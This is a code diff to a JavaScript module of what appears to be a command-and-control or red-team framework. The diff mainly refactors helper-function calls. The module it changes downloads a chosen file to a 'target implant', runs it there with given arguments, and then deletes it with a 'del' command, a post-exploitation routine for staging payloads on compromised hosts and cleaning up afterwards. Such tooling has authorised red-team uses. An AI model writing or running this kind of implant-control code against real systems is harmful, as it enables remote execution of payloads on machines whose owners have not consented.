@@ -30,7 +30,7 @@ exports.load = function (app) {
 
         description: "Downloads and runs a file on the target implant",
 
-        requiredPayloads: ["Command", "Download"]
+        requiredPayloads: ["command", "download"]
     }
     return module;
 };
@@ -39,76 +39,67 @@ exports.load = function (app) {
 exports.run = async function (app, run) {
     var file = await app.service("/fs/files").get(run.options.file.value).catch(() => {});
     if (!file){
-        moduleHelper.logError(run, "File not found");
-        moduleHelper.fail(run);
-        moduleHelper.patch(app,run);
+        moduleHelper.logError(app,run, "File not found");
+        moduleHelper.fail(app, run);
         return;
     }
 
     // Creating the job and setting the callback
-    var job = await moduleHelper.createJob(app,run,"afterDownload" ,{type:"Download", options:{ file: file.filename, file_id: file._id, length: file.length, chunkSize: file.chunkSize, path: run.options.path.value}}).catch(() => {});
+    var job = await moduleHelper.createJob(app,run,"afterDownload" ,{type:"download", options:{ file: file.filename, file_id: file._id, length: file.length, chunkSize: file.chunkSize, path: run.options.path.value}}).catch(() => {});
     if(!job){
-        moduleHelper.logError(run, "Error Creating Download Job");
-        moduleHelper.fail(run);
-        moduleHelper.patch(app,run);
+        moduleHelper.logError(app, run, "Error Creating Download Job");
+        moduleHelper.fail(app, run);
         return;
     }
-    moduleHelper.logInfo(run, "Requested the download of: " + file.filename);
-    moduleHelper.inProgress(run);
-    moduleHelper.patch(app,run);
+    moduleHelper.logInfo(app, run, "Requested the download of: " + file.filename);
+    moduleHelper.inProgress(app, run);
 };
 
 // There are callback than can be executed once jobs are completed
 exports.afterDownload = async function (app, run, job) {
     // If job failed
     if(job.jobStatus == 4 ){
-        moduleHelper.logError(run, "Error during download: " + job.result);
-        moduleHelper.fail(run);
-        moduleHelper.patch(app,run);
+        moduleHelper.logError(app, run, "Error during download: " + job.result);
+        moduleHelper.fail(app, run);
         return;
     }
     // We can add variables to the run
     run.filepath = job.result;
-
-    var job2 = await moduleHelper.createJob(app,run,"afterExecute" ,{type:"Command", options:{cmd: job.result + " " + run.options.arguments.value}}).catch(() => {});
+    var job2 = await moduleHelper.createJob(app,run,"afterExecute" ,{type:"command", options:{cmd: job.result + " " + run.options.arguments.value}}).catch(() => {});
     if(!job2){
-        moduleHelper.logError(run, "Error Creating Command Job");
-        moduleHelper.fail(run);
-        moduleHelper.patch(app,run);
+        moduleHelper.logError(app, run, "Error Creating Command Job");
+        moduleHelper.fail(app, run);
         return;
     }
-    moduleHelper.logSuccess(run, "Download succeeded, executing: " + job.result + " " + run.options.arguments.value);
-    moduleHelper.patch(app,run);
+    moduleHelper.logSuccess(app, run, "Download succeeded, executing: " + job.result + " " + run.options.arguments.value);
 };
 
 // There are callback than can be executed once jobs are completed
 exports.afterExecute = async function (app, run, job) {
-
     // If job failed
     if(job.jobStatus == 4 ){
-        moduleHelper.logError(run, "Error during Execute, trying to delete:\r\n" + job.result);
+        moduleHelper.logError(app, run, "Error during Execute, trying to delete:\r\n" + job.result);
     }else{
-        moduleHelper.logSuccess(run, "Successfully executed command: \r\n" + job.result);
+        moduleHelper.logSuccess(app, run, "Successfully executed command: \r\n" + job.result);
     }
-    var job2 = await moduleHelper.createJob(app,run,"afterDelete" ,{type:"Command", options:{cmd: "del " + run.filepath}}).catch(() => {});
+    var job2 = await moduleHelper.createJob(app,run,"afterDelete" ,{type:"command", options:{cmd: "del " + run.filepath}}).catch(() => {});
     if(!job2){
-        moduleHelper.logError(run, "Error Creating Delete Job, file must be deleted manually");
-        moduleHelper.fail(run);
-        moduleHelper.patch(app,run);
+        moduleHelper.logError(app, run, "Error Creating Delete Job, file must be deleted manually");
+        moduleHelper.fail(app, run);
         return;
     }
-    moduleHelper.patch(app,run);
+
 };
 
 // There are callback than can be executed once jobs are completed
 exports.afterDelete = async function (app, run, job) {
     // If job failed
     if(job.jobStatus == 4 ){
-        moduleHelper.logError(run, "Error during delete, file must be deleted manually");
-        moduleHelper.fail(run);
+        moduleHelper.logError(app, run, "Error during delete, file must be deleted manually");
+        moduleHelper.fail(app, run);
     }else{
-        moduleHelper.logSuccess(run, "Successfully deleted file");
-        moduleHelper.success(run);
+        moduleHelper.logSuccess(app, run, "Successfully deleted file");
+        moduleHelper.success(app, run);
     }
-    moduleHelper.patch(app,run);
+
 };
